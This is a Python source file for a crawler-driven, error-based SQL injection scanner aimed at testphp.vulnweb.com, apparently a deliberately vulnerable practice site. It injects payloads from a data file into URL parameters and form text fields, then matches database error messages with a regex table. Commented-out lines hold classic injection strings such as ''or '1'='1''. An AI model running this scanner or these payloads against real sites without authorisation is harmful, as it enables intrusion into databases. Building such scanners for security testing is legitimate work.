from crawler import Crawler
import requests
from bs4 import BeautifulSoup
from urllib.parse import urlparse
from urllib import parse
import re
import re



DBMS_ERRORS = {                                                                     # regular expressions used for DBMS recognition based on error message response
    "MySQL": (r"SQL syntax.*MySQL", r"Warning.*mysql_.*", r"valid MySQL result", r"MySqlClient\."),
    "PostgreSQL": (r"PostgreSQL", r"PostgreSQL.*ERROR", r"Warning.*\Wpg_.*", r"valid PostgreSQL result", r"Npgsql\."),
    "Microsoft SQL Server": (r"Driver.* SQL[\-\_\ ]*Server", r"OLE DB.* SQL Server", r"(\W|\A)SQL Server.*Driver", r"Warning.*mssql_.*", r"(\W|\A)SQL Server.*[0-9a-fA-F]{8}", r"(?s)Exception.*\WSystem\.Data\.SqlClient\.", r"(?s)Exception.*\WRoadhouse\.Cms\."),
    "Microsoft Access": (r"Microsoft Access Driver", r"JET Database Engine", r"Access Database Engine"),
    "Oracle": (r"\bORA-[0-9][0-9][0-9][0-9]", r"Oracle error", r"Oracle.*Driver", r"Warning.*\Woci_.*", r"Warning.*\Wora_.*"),
    "IBM DB2": (r"CLI Driver.*DB2", r"DB2 SQL error", r"\bdb2_\w+\("),
    "SQLite": (r"SQLite/JDBCDriver", r"SQLite.Exception", r"System.Data.SQLite.SQLiteException", r"Warning.*sqlite_.*", r"Warning.*SQLite3::", r"\[SQLITE_ERROR\]"),
    "Sybase": (r"(?i)Warning.*sybase.*", r"Sybase message", r"Sybase.*Server message.*"),
}

class SqliScanner:
	def __init__(self,internal_hrefs,get_forms,post_forms, session):
		self.internal_hrefs = internal_hrefs
		self.base = "http://testphp.vulnweb.com/"  # bunu almalı
		self.session = session
		self.get_forms = get_forms
		self.post_forms = post_forms
		self.href_with_parameters = []
		self.payloads = []
		self.preperation()
		self.get_parameterized_hrefs()
		self.load_paylaods()
		#self.url_based_search()
		self.forms_based_search()



	def preperation(self):
		user_agent = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; ru) Opera 8.01"
		self.headers 		= requests.utils.default_headers()
		self.headers['User-Agent'] = user_agent
		#self.session = requests.session()



	def get_parameterized_hrefs(self):
		for url in self.internal_hrefs:
			parsed = urlparse(url)
			try:
				query = parsed.query
				if query != "":
					self.href_with_parameters.append(url)
			except:
				pass


	def load_paylaods(self):
		with open("data/sqli.dat") as fp:
			for payload in fp:
				payload = payload.rstrip("\n")
				self.payloads.append(payload)

	def url_based_search(self):
		for url in self.href_with_parameters:
			for payload in self.payloads:
				modified_url = self.modify_url(url,payload)
				if self.test_url(modified_url):
					break




	# def print_payloads(self):
	# 	print(self.payloads)

	def modify_url(self,url,payload):
		parsed = urlparse(url)
		querys = parsed.query.split("&")
		new_query = "&".join([ "{}{}".format(query, payload) for query in querys])
		parsed = parsed._replace(query=new_query)
		return parsed.geturl()

	def test_url(self,url):
		response = self.session.get(url).text
		if self.search_string(response,url+"(url based)"):
			return True

	def search_string(self,text,url):
		for i in DBMS_ERRORS.values():
			for j in i:
				result = re.search(j,text,re.IGNORECASE)
				if result != None:
					print(url)
					print("Possible SQL injection based on error")
					return True
		return None



	def forms_based_search(self):
		for _form in self.post_forms:
			for payload in self.payloads:
			
				url, form = _form
				#print(url)
				url, form_dictionary, target, form = self.create_form(url,form,payload)

				# self.create_form(form,payload)
				try:
					response = self.session.post(target,data=form_dictionary,headers=self.headers)
					if url == "http://testphp.vulnweb.com/userinfo.php":
						print(form_dictionary)
						print(target)
						print(response.content)
				except:
					print("Connection error with url:",target)
				if self.search_string(response.text,str(url)+"(form_based)"):
					break

	def create_form(self,url,form,payload):
		inputs 			= form.find_all("input")
		action 			= form.get('action')
		form_dictionary = {}
		target			= ""	

		for input in inputs:
			input_name 		= input.get('name')
			input_type		= input.get('type')
			input_value 	= input.get('value')

			if input_type == "text": input_value = payload

			form_dictionary[input_name] = input_value

		if action == "" or action == '#':
			target = url
			#print(target)
		else:
			target = parse.urljoin(self.base,action)
			#print(target)

		return url ,form_dictionary, target, form


crawler = Crawler("http://testphp.vulnweb.com/")
href_list,get_forms, post_forms, session 	= crawler.return_results()

# for i in post_forms:
# 	url, form = i
sqli_scanner = SqliScanner(href_list,get_forms, post_forms, session)
#print(sqli_scanner.href_with_parameters)


# url ="http://ahmetcan.com/path?h=1&c=19"
# parsed = urlparse(url)
# print(dir(parsed))
# print(parsed.geturl)
# print(parsed.path)
# print(parsed.query)

# new_query = "h=61&c=16"
# parsed = parsed._replace(query=new_query)

# print(parsed)


# payloads = []
# with open("data/sqli.dat") as fp:
# 	for payload in fp:
# 		payload = payload.rstrip("\n")
# 		payloads.append(payload)
# 		print(payload)

# url = "http://www.example.com?type=a&type1=b&type2=c"

# trigger = ["'or '1'='1'"," 'OR '1'='2'","'OR a=a"]

# parsed = urlparse(url)
# querys = parsed.query.split("&")
# result = []
# for pairs in trigger:
#     new_query = "&".join([ "{}{}".format(query, pairs) for query in querys])
#     parsed = parsed._replace(query=new_query)
#     print(parsed)

# for i in DBMS_ERRORS.values():
# 	for j in i:
# 		result = re.search(j,"Warning: mysql_fetch_array() expects parameter 1 to be resource,",re.IGNORECASE)
# 		if result != None:
# 			print("Possible SQL injection based on error")